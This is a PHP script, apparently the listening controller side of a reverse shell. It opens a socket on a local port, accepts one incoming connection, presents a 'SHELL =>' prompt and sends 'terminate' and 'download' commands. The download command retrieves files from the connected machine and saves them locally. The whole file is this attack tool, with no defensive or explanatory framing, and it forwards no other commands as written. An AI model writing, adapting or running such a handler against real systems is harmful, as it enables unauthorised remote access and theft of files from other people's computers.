<?php
$host = "127.0.0.1";
// $port = 19608;
$port = 12927;
set_time_limit(0);
$socket = socket_create(AF_INET,SOCK_STREAM,SOL_TCP) or die("could not create socket\n");
if($socket){
    echo "socket created\n";
}
$result = socket_bind($socket,$host,$port) or die("could not bind socket\n");
$result = socket_listen($socket,3) or die("could not listen\n");
$spawn = socket_accept($socket) or die("could not accpet incoming connection\n");
$terminate = "terminate";
$closed = false;
while(true){
    if(!$closed){
        echo "SHELL => ";
    }else{
        die("connection closed successfully");
    }
    $input = trim(fgets(STDIN));
    if(strpos($terminate,$input) !== false){
        socket_write($spawn,$terminate,strlen($terminate)) or die("could not write ouput");
        socket_close($spawn);
        $closed = true;
    }else if(strpos($input,"download") !== false){
        preg_match("/^\s*download\s+(.+)\s*(2>&1)?$/", $input,$match);
        $filename = basename($match[1]);
        socket_write($spawn,$input,strlen($input)) or die("could not write ouput");
        $fh = fopen("shell".$filename,"wb");
        $fileData = socket_read($spawn,1024);
        while(!strpos($fileData,"completed")){
            if(fwrite($fh,$fileData)){
                echo "write\n";
            }else{
                echo "not write\n";
            }
            $fileData = socket_read($spawn,1024);
        }
        // $fileData = socket_read($spawn,1024000);
        // echo $fileData;
        fclose($fh);
        echo "file downloaded successully\n";
    }
}
?>
